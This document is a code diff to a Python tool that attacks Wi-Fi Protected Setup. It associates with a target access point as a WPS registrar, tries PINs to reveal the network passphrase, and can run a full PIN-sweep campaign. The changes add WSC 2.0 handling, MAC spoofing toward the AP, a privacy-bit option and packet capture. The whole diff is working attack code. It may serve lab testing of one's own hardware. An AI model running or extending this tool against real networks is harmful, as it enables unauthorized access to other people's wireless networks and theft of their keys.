@@ -147,10 +147,14 @@ async def find_ap(iface, array, channel: int, bssid: str | None, ssid: str | Non
 
 
 async def run_one_attempt(iface, bssid: str, ssid: str, channel: int, our_mac: bytes,
-                          pin: str, expect: str, capture: list) -> None:
-    step(f"Attempt PIN {pin}  (expect: {expect})")
+                          pin: str, expect: str, capture: list, wsc_2_0: bool,
+                          privacy=None) -> None:
+    step(f"Attempt PIN {pin}  (expect: {expect}, WSC {'2.0' if wsc_2_0 else '1.0'}, "
+         f"assoc privacy bit="
+         f"{'auto' if privacy is None else ('on' if privacy else 'off')})")
     assoc = Association(iface, bssid, ssid, channel, our_mac=our_mac,
-                        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR))
+                        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, wsc_2_0),
+                        privacy=privacy)
     assoc.start()
     # Record our TX frames into the same capture list as RX → full-conversation pcap.
     transport = WlanTransport(iface, str_to_mac(bssid), our_mac,
@@ -162,7 +166,8 @@ async def run_one_attempt(iface, bssid: str, ssid: str, channel: int, our_mac: b
         else:
             ok(f"Associated as {mac_str(our_mac)}")
         transport.start()
-        reg = WpsRegistrar(transport, str_to_mac(bssid), our_mac, log=lambda m: print(f"    {m}"))
+        reg = WpsRegistrar(transport, str_to_mac(bssid), our_mac, channel=channel,
+                           wsc_2_0=wsc_2_0, log=lambda m: print(f"    {m}"))
         outcome = await reg.try_pin(pin)
     finally:
         transport.stop()
@@ -184,7 +189,7 @@ async def run_one_attempt(iface, bssid: str, ssid: str, channel: int, our_mac: b
 
 
 async def main_async(args) -> int:
-    defaults = load_default_target()
+    defaults = {} if args.bssid else load_default_target()
     bssid = args.bssid or defaults.get("bssid")
     ssid = args.ssid if args.ssid is not None else defaults.get("ssid", "")
     channel = args.channel or int(defaults.get("channel", "1"))
@@ -196,10 +201,12 @@ async def main_async(args) -> int:
 
     ifaces, iface, array = await discover_iface(args.debug)
     capture: list = []
-    iface.register_rx_callback(lambda pkt: capture.append((time.monotonic(), pkt.raw)))
+    iface.register_rx_callback(lambda pkt: capture.append((time.time(), pkt.raw)))
     our_mac = bytes([0x02, 0xAA, 0xBB]) + struct.pack(">I", int(time.time()))[1:]
     try:
         found_ap = await find_ap(iface, array, channel, bssid, ssid, args.scan_secs)
+        if found_ap and not ssid:
+            ssid = found_ap.ssid or ""
 
         if args.campaign:
             from types import SimpleNamespace
@@ -209,9 +216,10 @@ async def main_async(args) -> int:
                                                  channel=channel, wps_locked=False)
             step(f"Run full WpsCampaign (up to {args.max_secs:.0f}s)")
             camp = WpsCampaign(array, target, log=lambda m: print(f"    {m}"))
-            camp.start()
-            end = time.time() + args.max_secs
-            while time.time() < end and camp.status in ("idle", "running", "paused", "locked"):
+            if not camp.run():
+                fail("another campaign already owns the radio")
+            end = time.monotonic() + args.max_secs
+            while time.monotonic() < end and not camp.done:
                 await asyncio.sleep(0.5)
             await camp.stop()
             step("Results")
@@ -226,6 +234,14 @@ async def main_async(args) -> int:
             write_pcap(Path(args.out), capture)
             return 0
 
+        fake_mac = await iface.set_fake_mac(None, str_to_mac(bssid))
+        if fake_mac:
+            our_mac = str_to_mac(fake_mac)
+            info(f"Active monitor: card HW-ACKs {fake_mac}")
+        else:
+            info(f"[warn] {iface.name} can't active-monitor; the AP's frames to "
+                 f"{mac_str(our_mac)} go unACKed and it will retransmit them.")
+
         if args.pin:
             attempts = [(args.pin, "as given")]
         else:
@@ -233,8 +249,11 @@ async def main_async(args) -> int:
                 (derive_wrong_pin(known_pin), "incorrect: second half wrong"),
                 (known_pin, "CORRECT: should reveal PSK"),
             ]
+        privacy = {"auto": None, "on": True, "off": False}[args.privacy]
         for i, (pin, expect) in enumerate(attempts):
-            await run_one_attempt(iface, bssid, ssid, channel, our_mac, pin, expect, capture)
+            await run_one_attempt(iface, bssid, ssid, channel, our_mac, pin, expect, capture,
+                                  bool(found_ap and found_ap.wps_version == "2.0"),
+                                  privacy=privacy)
             if i + 1 < len(attempts):
                 info(f"Re-associating for next attempt in {args.attempt_gap:.0f}s …")
                 await asyncio.sleep(args.attempt_gap)
@@ -246,6 +265,7 @@ async def main_async(args) -> int:
         return 0
     finally:
         step("Release device")
+        await iface.clear_fake_mac()
         await wlan_close(ifaces)
         info("Closed.")
 
@@ -253,12 +273,14 @@ async def main_async(args) -> int:
 def main() -> int:
     p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
     p.add_argument("--bssid", help="target AP BSSID (default: driver_sources/wps_pin.txt)")
-    p.add_argument("--ssid", help="target AP SSID (default: from wps_pin.txt)")
-    p.add_argument("--channel", type=int, help="target channel (default: from wps_pin.txt)")
+    p.add_argument("--ssid", help="target AP SSID (default: from the scan with --bssid, else wps_pin.txt)")
+    p.add_argument("--channel", type=int, help="target channel (default: 1 with --bssid, else wps_pin.txt)")
     p.add_argument("--pin", help="try a single specific 8-digit PIN instead of the wrong+correct pair")
     p.add_argument("--campaign", action="store_true",
                    help="run the full WpsCampaign sweep (COMMON->first-half->second-half) instead of the probe pair")
     p.add_argument("--max-secs", type=float, default=120.0, help="campaign time budget")
+    p.add_argument("--privacy", choices=["auto", "on", "off"], default="auto",
+                   help="assoc-request Privacy capability bit (auto: off for a WPS assoc)")
     p.add_argument("--scan-secs", type=float, default=6.0)
     p.add_argument("--attempt-gap", type=float, default=3.0, help="delay between the two attempts")
     p.add_argument("--out", default="wifit3-wps-probe.pcap", help="pcap output path")
